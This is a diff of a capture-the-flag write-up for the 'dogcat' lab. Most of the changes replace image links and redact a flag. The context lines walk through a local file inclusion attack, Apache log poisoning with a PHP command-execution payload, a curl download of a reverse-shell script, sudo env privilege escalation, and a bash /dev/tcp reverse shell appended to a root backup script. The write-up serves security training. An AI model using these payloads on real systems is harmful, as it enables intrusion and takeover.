@@ -8,7 +8,7 @@ Difficulty: Medium
 
 Date: 05/07/2025
 
-Status: 
+Status: Rooted
 
 ---
 
@@ -46,13 +46,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Port 80:
 
-![image.png](image.png)
+![image](https://github.com/user-attachments/assets/caf6ea82-fd18-4e12-a002-2f026b32066f)
 
 Just a index page with two buttons, one for viewing dog’s pictures and one for cat’s images.
 
 Url looks little bit wierd [`http://10.10.87.70/?view=dog`](http://10.10.87.70/?view=dog) , maybe local file inclusion here, let’s try.
 
-![image.png](image%201.png)
+![image 1](https://github.com/user-attachments/assets/536ac3f1-512a-495b-8a6c-c8e7cdbb3981)
 
 It says , sorry only dogs and cats are allowed.
 
@@ -60,15 +60,14 @@ When we try to provide dog.php to its url , it raise an error, Warning: include(
 
 It means , it is already including .php extension to whatever name, we are providing.
 
-![image.png](image%202.png)
+![image 2](https://github.com/user-attachments/assets/11d94a03-8dba-4e0a-8036-df256cc4a4d4)
 
 We can try LFI php payload to check if it’s vulnerable.
 
 ```bash
 http://10.10.246.83/?view=
 ```
-
-![image.png](image%203.png)
+![image 3](https://github.com/user-attachments/assets/39cd90e3-8470-44f4-bb74-16234640eefb)
 
 Now, it’s clear that it is a local file inclusion vulnerability. 
 
@@ -133,7 +132,8 @@ Since `"dog"` is present in the string, the check passes — and this becomes a 
 
 Our Nmap scan above discovered that this application run on apache server, so let’s try to access it’s `access.log` file.
 
-![image.png](image%204.png)
+![image 4](https://github.com/user-attachments/assets/3698f24a-2145-4c5f-aea0-211d963e904d)
+
 
 It’s a clear log poisoning vulnerability, we were able to read it’s log file. Now, we just have to exploit it to finally chain this to remote code execution.
 
@@ -149,7 +149,7 @@ Send a request with custom User-Agent or another HTTP header like:
 User-Agent: <?php system($_GET['cmd']); ?>
 ```
 
-![image.png](image%205.png)
+![image 5](https://github.com/user-attachments/assets/a242b97d-3469-4835-aef4-98d8349e4170)
 
 Step 2: Try accessing:
 
@@ -157,7 +157,7 @@ Step 2: Try accessing:
 /?view=dog../../../../var/log/apache2/access.log&ext=&cmd=id
 ```
 
-![image.png](image%206.png)
+![image 6](https://github.com/user-attachments/assets/6eb94531-d833-40b4-a4f7-808fadd0a6ff)
 
 Now, we can inject our command there.
 
@@ -186,9 +186,10 @@ Now, we can simply upload php-reverse-shell and can execute it via browser to ge
     http://10.10.246.83/?view=./dog/../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o shell.php ip:80/shell.php
     ```
     
-    ![image.png](image%207.png)
-    
-    ![image.png](image%208.png)
+    ![image 7](https://github.com/user-attachments/assets/bc06aca7-abe4-41d4-ae9b-42cb734020f8)
+
+    ![image 8](https://github.com/user-attachments/assets/2ea7f182-0b35-4cfd-a624-bb0e42aae6b3)
+
     
 3. Now , just trigger that shell.php file via browser and you will gonna get reverse shell back to your machine:
     
@@ -196,9 +197,8 @@ Now, we can simply upload php-reverse-shell and can execute it via browser to ge
     http://10.10.246.83/shell.php
     ```
     
-    ![image.png](image%209.png)
+    ![image 9](https://github.com/user-attachments/assets/baa17f74-05b8-4e76-9f5f-4443c55e6970)
     
-
 ---
 
 ### Flag 1 & 2:
@@ -208,7 +208,7 @@ $ pwd
 /var/www/html
 $ cat flag.php
 <?php
-$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+$flag_1 = "THM{REDACTED}"
 ?>
 $ cd ..
 $ ls
@@ -224,11 +224,12 @@ THM{REDACTED}
 
 We can check our sudo privileges firstly:
 
-![image.png](image%2010.png)
+![image 10](https://github.com/user-attachments/assets/f0059b7e-edf3-4491-b4da-47c549037ea9)
+
 
 As you can see , we can use /usr/bin/env with sudo privileges, let’s use it to get root shell.
 
-![image.png](image%2011.png)
+![image 11](https://github.com/user-attachments/assets/88d8b91a-2d8b-4fc8-b0e2-f47bc71313c3)
 
 [env
             
@@ -253,7 +254,7 @@ THM{REDACTED}
 
 In /opt/backups we can se that there is a backup script that is run regularly to generate a backup.tar file. Let’s use this to genreate another reverse shell outside of this container.
 
-![image.png](image%2012.png)
+![image 12](https://github.com/user-attachments/assets/de876c09-1429-4b59-88c8-a6f50a1b20f9)
 
 We can easily exploit, that this script is run every other minute with root privileges, by inserting some code that will generate a reverse connection to us.
 To insert this code into the script, simply run this:
@@ -265,7 +266,7 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/<ip>/4445 0>&1'" >> /opt/backups/backup.
 
 And listen on your kali machine, and with in few seconds, you will get containered root shell.
 
-![image.png](image%2013.png)
+![image 13](https://github.com/user-attachments/assets/de77cbea-bb5d-45f0-80e4-876f99271a76)
 
 ```bash
 root@dogcat:~# ls -la
